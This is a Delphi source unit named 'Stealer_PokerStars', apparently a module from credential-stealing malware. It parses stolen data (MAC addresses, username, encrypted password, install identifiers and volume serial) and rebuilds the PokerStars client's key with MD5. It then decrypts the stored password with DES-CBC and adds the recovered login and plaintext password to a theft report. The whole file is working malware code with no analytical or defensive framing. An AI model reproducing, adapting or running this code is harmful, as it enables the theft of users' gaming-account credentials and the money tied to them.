unit Stealer_PokerStars;

interface

uses
  Sysutils,Windows,Classes,dialogs,DCPdes,DCPmd5;

var
gsl:tstringlist;

function ProcessShit(hmem:DWORD;dsize:DWORD;placeto:tstringlist): dword;

implementation

uses Parser;

function AdapterToString(hmem:DWORD): AnsiString;
var
  buf:array[0..5] of byte;
begin
  CopyMemory(@buf,pointer(hmem),sizeof(buf));
  Result := Format('%2.2x%2.2x%2.2x%2.2x%2.2x%2.2x',
      [(buf[0]), (buf[1]),
       (buf[2]), (buf[3]),
       (buf[4]), (buf[5])]);
end;

function GetPokerStarsMac(Reverse: Boolean): AnsiString;
var
  i: Integer;
begin
  Result := '';
    case Reverse of
      True: begin
        for i := gsl.Count-1 downto 0 do
          Result := Result + 'MAC=' + gsl[i] + ';'
      end;
      False: begin
        for i := 0 to gsl.Count-1 do
          Result := Result + 'MAC=' + gsl[i] + ';'
      end;
    end;
end;

function DecryptPassRev(Reverse: Boolean; const UserName,Password: AnsiString; InstanceA,InstanceB,volid:DWORD): AnsiString;
var
  S: AnsiString;
  i: Integer;
  digest: array[0..15] of Byte;
  des: TDCP_des;
  md5: TDCP_md5;
  skey: AnsiString;
  W: AnsiString;
begin
  Result := '';
  if (Length(Password) mod 16 <> 0) or (Length(Password) = 0) then Exit;
  S := '';
  for i := 1 to Length(Password) div 2 do
    S := S + AnsiChar(((Ord(Password[i*2-1])-$23) shl 4) + Ord(Password[i*2]));
  skey := '';
  W := 'INSTALL=';
  skey := skey + W + IntToHex(InstanceA, 8) + AnsiString(IntToHex(InstanceB, 8)) + ';';
  skey := skey + GetPokerStarsMac(Reverse);
  
  W := 'SYSVOL=';
  skey := skey + W + AnsiString(IntToHex(volid, 8)) + ';';

  md5 := TDCP_md5.Create(nil);
  md5.Init;
  md5.UpdateStr(skey);
  md5.Final(digest);
  md5.Burn;
  md5.Free;

  des := TDCP_des.Create(nil);
  des.Init(digest[0], 64, @digest[8]);
  des.DecryptCBC(S[1], S[1], Length(S));
  des.Burn;
  des.Free;

  S := Trim(Copy(S, 1, Length(S)-Ord(S[Length(S)])));

  Result := UTF8Decode(S);

  if UserName <> '' then begin
    if Copy(Result, Length(Result)-Length(UserName)+1, Length(UserName)) = UserName then begin
      Delete(Result, Length(Result)-Length(UserName)+1, Length(UserName));
      Result := Trim(Result);
    end else
      Result := '';
  end;
end;

function ProcessShit(hmem:DWORD;dsize:DWORD;placeto:tstringlist): dword;
var
  mcnt:byte;
  i:integer;
  adapters:tstringlist;
  dwtmp,volID,instA,instB:DWORD;
  UserName,Password,dpwd:ansistring;
begin
  gsl:=tstringlist.Create;
  adapters:=tstringlist.Create;
  result:=0;
  if dsize<=0 then exit;
  CopyMemory(@mcnt,pointer(hmem),sizeof(mcnt));
  inc(hmem,1);
  for i:=1 to mcnt do
  begin
    gsl.add(AdapterToString(hmem));
    inc(hmem,6);
  end;
  CopyMemory(@dwtmp,pointer(hmem),sizeof(dwtmp));
  inc(hmem,4);
  SetLength(UserName, dwtmp);
  CopyMemory(pointer(UserName),pointer(hmem),dwtmp);
  inc(hmem,dwtmp);
  CopyMemory(@dwtmp,pointer(hmem),sizeof(dwtmp));
  inc(hmem,4);
  SetLength(Password, dwtmp);
  CopyMemory(pointer(Password),pointer(hmem),dwtmp);
  inc(hmem,dwtmp);
  CopyMemory(@instA,pointer(hmem),4);
  inc(hmem,4);
  CopyMemory(@instB,pointer(hmem),4);
  inc(hmem,4);
  CopyMemory(@volID,pointer(hmem),sizeof(volID));
  dpwd := DecryptPassRev(False, UserName, Password,instA,instB,volID);
  if dpwd = '' then
  dpwd := DecryptPassRev(True, UserName, Password,instA,instB,volID);

  placeto.Add(formattype(REPORT_DATA_LOGIN)+UserName);
  placeto.Add(formattype(REPORT_DATA_PWD)+dpwd);
  
  adapters.free;
  gsl.Free;
end;

end.
